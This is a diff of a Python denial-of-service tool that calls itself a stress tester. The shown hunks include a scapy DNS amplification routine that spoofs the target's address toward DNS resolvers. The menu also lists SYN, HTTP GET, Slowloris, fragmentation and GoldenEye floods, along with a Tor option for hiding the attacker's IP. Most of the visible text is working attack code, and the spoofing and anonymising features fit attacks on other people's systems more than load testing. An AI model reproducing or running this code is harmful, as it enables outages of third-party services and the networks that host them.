@@ -1,8 +1,18 @@
+"""
+DDOS Stress Testing Tool
+
+This tool provides multiple attack options for stress testing networks.
+Developed collaboratively by the DDOS team at DeepCytes.
+Contributions are welcomed and appreciated.
+
+"""
+
 import os , subprocess ,sys
 import urllib.parse,ipaddress
 import socket,string,time
 from random import randint , choice
 import threading
+import random
 from scapy.all import IP, ICMP, send ,conf,UDP, DNS, DNSQR
 
 CRED = '\033[31m'  
@@ -493,8 +503,8 @@ def dns_amp():
 
     def dns_amplification():
         while True:
-            dns_server = choice(dns_servers)  # Choose a random DNS server
-            domain = choice(known_domains)    # Choose a random domain
+            dns_server = choice(dns_servers)  
+            domain = choice(known_domains)   
             ip_layer = IP(src=target_ip, dst=dns_server)
             udp_layer = UDP(dport=53)
             dns_layer = DNS(rd=1, qd=DNSQR(qname=domain))
@@ -511,6 +521,9 @@ def dns_amp():
     for t in threads_list:
         t.join()
 
+def invalid():
+    print(CGREEN + "\n\n[:/] " + CEND + "Scripts arent uploaded for the following attack | Exiting...." + CEND)
+    sys.exit(0)
 #------------------------------------------------------------------
 
 
@@ -524,17 +537,18 @@ def dashboard():
     else:
         print(CRED + f"[!] IP Hopping w Tor is Inactive..\n" + CEND)
     print(CGREEN + "  [0] " + CEND + "Start TOR Service [IP Hopping]\n" + CEND)
-    print(CGREEN + "  [1] " + CEND + "SYN FLOOD ATTACK" + CEND)
-    print(CGREEN + "  [2] " + CEND + "HTTP GET FLOOD ATTACK" +CEND) 
-    print(CGREEN + "  [3] " + CEND + "UDP FLOOD ATTACK" + CEND)
-    print(CGREEN + "  [4] " + CEND + "SLOWLORIS ATTACK" + CEND)
-    print(CGREEN + "  [5] " + CEND + "IP FRAGMENTATION ATTACK" + CEND)
-    print(CGREEN + "  [6] " + CEND + "DNS AMPLIFICATION ATTACK\n" + CEND)
-    print(CGREEN + "  [7] " + CEND + "Exit" + CEND)
+    print(CGREEN + "  [1] " + CEND +"SYN FLOOD ATTACK" + CEND)
+    print(CGREEN + "  [2] " + CEND +"HTTP GET FLOOD ATTACK" +CEND) 
+    print(CYELLOW + "  [3] " + "UDP FLOOD ATTACK" + CEND)
+    print(CGREEN + "  [4] " + CEND +"SLOWLORIS ATTACK" + CEND)
+    print(CGREEN + "  [5] " + CEND +"IP FRAGMENTATION ATTACK" + CEND)
+    print(CGREEN + "  [6] " + CEND +"DNS AMPLIFICATION ATTACK" + CEND)
+    print(CYELLOW + "  [7] " + "GOLDEN EYE ATTACK\n" + CEND)
+    print(CGREEN + "  [8] " + CEND + "Exit" + CEND)
     choice = input(CGREEN + "\n[-] Enter your choice [0-8]: " + CEND)
     
     # Additional error handling for invalid choices
-    if choice not in ['0','1', '2', '3', '4', '5', '6', '7']:
+    if choice not in ['0','1', '2', '3', '4', '5', '6', '7','8']:
         print(CRED + "[!] Invalid choice. Please select a number between 1 and 7." + CEND)
         sys.exit(0)
     elif choice=='0':
@@ -543,13 +557,15 @@ def dashboard():
         syn_flood()
     elif choice=='2':
         http_flood()
+    elif choice=='3' or choice=='7':
+        invalid()
     elif choice=='4':
         slowloris_attack()
     elif choice=='5':
         ip_frag()
     elif choice=='6':
         dns_amp()
-    elif choice=='7':
+    elif choice=='8':
         exit()
 
 def main():
